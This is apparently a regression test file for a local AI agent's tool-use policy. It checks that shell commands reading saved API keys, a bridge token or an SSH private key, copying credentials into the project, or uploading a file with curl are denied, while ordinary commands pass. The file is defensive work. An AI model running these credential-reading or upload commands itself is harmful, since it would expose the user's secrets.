// Regression tests: the built-in shell tools may not read credentials, reach the
// network, or be used to copy them out. Write mode is on, so only the new
// command rules stand between these and the machine.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { checkToolUse } from '../bridge/policy.mjs'

const roots = ['C:\\Users\\HP\\Downloads\\jarvis-main', 'C:\\Users\\HP\\.jarvis\\workspace']
const judge = (name, command) =>
  checkToolUse(name, { command }, { allowWrites: true, cwd: roots[0], roots }).allow

test('shell commands cannot read the saved keys or the bridge key', () => {
  assert.equal(judge('Bash', 'type %USERPROFILE%\\.jarvis\\keys.json'), false)
  assert.equal(judge('Bash', 'cat ~/.jarvis/keys.json'), false)
  assert.equal(judge('PowerShell', "Get-Content (Join-Path $env:USERPROFILE '.jarvis\\keys.json')"), false)
  assert.equal(judge('PowerShell', 'Get-Content C:\\Users\\HP\\.jarvis\\bridge-token'), false)
})

test('shell commands cannot read SSH keys', () => {
  assert.equal(judge('PowerShell', "[IO.File]::ReadAllText('C:\\Users\\HP\\.ssh\\id_rsa')"), false)
})

test('a shell command cannot copy credentials into the project', () => {
  assert.equal(judge('Bash', 'cp C:/Users/HP/.jarvis/keys.json C:/Users/HP/Downloads/jarvis-main/k.txt'), false)
})

test('shell commands cannot reach the network', () => {
  assert.equal(judge('Bash', 'curl https://example.com/upload -d @file'), false)
  assert.equal(judge('PowerShell', 'Invoke-WebRequest https://example.com'), false)
})

test('ordinary shell work still runs', () => {
  assert.equal(judge('Bash', 'git status'), true)
  assert.equal(judge('Bash', 'ls bridge'), true)
  assert.equal(judge('PowerShell', 'Get-ChildItem C:\\Users\\HP\\Downloads'), true)
})
